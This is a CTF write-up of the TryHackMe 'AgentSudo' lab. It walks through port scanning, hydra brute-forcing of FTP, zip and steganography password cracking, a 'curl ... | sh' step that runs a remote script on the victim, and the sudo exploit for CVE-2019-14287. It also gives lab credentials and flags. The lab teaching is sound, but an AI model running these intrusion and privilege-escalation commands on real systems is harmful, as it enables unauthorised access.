---
title: "[TryHackMe] AgentSudo"
author: Tri Nguyen
date: 2021-11-20 17:00:00 -0700
categories: [CTF, Write Up]
tags: [ctf, write-up, tryhackme, agent-sudo, thm]
---

IP: http://10.10.239.92/

# Task 2: Enumerate

## How many open ports?

- nmap scan

```shell
┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo]
└─# nmap -sS -sV -p- 10.10.239.92 | tee nmap.txt  
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-20 17:42 EST
Nmap scan report for 10.10.239.92
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 827.24 seconds
```

- `3` open ports.

## How you redirect yourself to a secret page?

- When you go to the website, it said

    > Use your own **codename** as user-agent to access the site.

- `user-agent`

## What is the Agent's name?

- I parse the request to Burp's repeater. Not sure where to look for agent name, but in the hint, it said that try with `User-Agent: C`

- We are redirected to `agent_C_attention.php`

- Agent name is `chris`

# Task 3: Hash cracking and brute-force

## FTP Password

```shell
hydra -t 30 -l chris -P /usr/share/wordlists/rockyou.txt -vV 10.10.239.92 ftp
```

- FTP: `chris:crystal`

## Zip file password

- We have 2 pictures and a txt file but no zip files.

- May be it is embedded in the pictures!

```shell
┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo]
└─# binwalk -e cutie.png          

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

- Taada! A zip file. But it is password protected. It is located in your extracted folder, `8702.zip`

- We are gonna crack it using JohnTheRipper.

- Googling around shows me how.

```shell
$ zip2john 8702.zip > 8702.hash

┌──(root💀kali)-[/home/…/Desktop/thm/agent-sudo/_cutie.png.extracted]
└─# john 8702.hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                           1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2021-11-20 19:07) 3.703g/s 113777p/s 113777c/s 113777C/s michael!..*star*
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Password is `alien`

## steg password:

- You will see a letter inside the zip file
    
    > We need to send the picture to 'QXJlYTUx' as soon as possible!

- It is a base64 string.

- `Area51`

## What is the other agent's name?

- We haven't looked at the jpeg yet. Use the password `Area51`

```shell
┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo]
└─# steghide info cute-alien.jpg                                                                                                         1 ⨯
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

$ steghide extract -sf cute-alien.jpg
```

- Read the extracted `message.txt`

- `james`

## What is the SSH password?

- `james:hackerrules!`

# Task 4: Capture the user flag

## What is the user flag?

- ssh to james's account. You will find the flag in the home directory.

- `b03d975e8c92a7c04146cfa7a5a313c7`

## What is the incident of the photo called?

- Grab the picture for further inspection. Nothing abnormal here. Hmm...

```shell
┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo]
└─# scp james@10.10.239.92:/home/james/Alien_autospy.jpg .
james@10.10.239.92\'s password: 
Alien_autospy.jpg                                                                                          100%   41KB  75.7KB/s   00:00    
                                                                                                                                             
┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo]
└─# exif Alien_autospy.jpg 
EXIF tags in 'Alien_autospy.jpg' ('Intel' byte order):
--------------------+----------------------------------------------------------
Tag                 |Value
--------------------+----------------------------------------------------------
X-Resolution        |72
Y-Resolution        |72
Resolution Unit     |Inch
Exif Version        |Exif Version 2.1
FlashPixVersion     |FlashPix Version 1.0
Color Space         |Uncalibrated
--------------------+----------------------------------------------------------
```

- Search the image on Google image and you find it ;) Somehow I find it disturbing.

- `Roswell Alien Autopsy`

# Task 5: Privilege Escalation

## What is the CVE?

- I downloaded linPEAS then run it remotely from the victim's machine

- Excerpt from linPEAS's instruction:

```shell
#Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```

- I gotta admit I work from the bottom up, weird...

- After running linPEAS, it points me to a sudo privelge escalation

    > https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version

- After I used it I got root access

```shell
sudo -u#-1 /bin/bash
```

- The CVE is `CVE-2019-14287` if you're wondering.

## Root flag

- In `/root`, `b53a02f55b57d4439e3341834d70c062`

## (Bonus) Who is agent R?

- In the root message, it said `DesKel` is agent R ;)


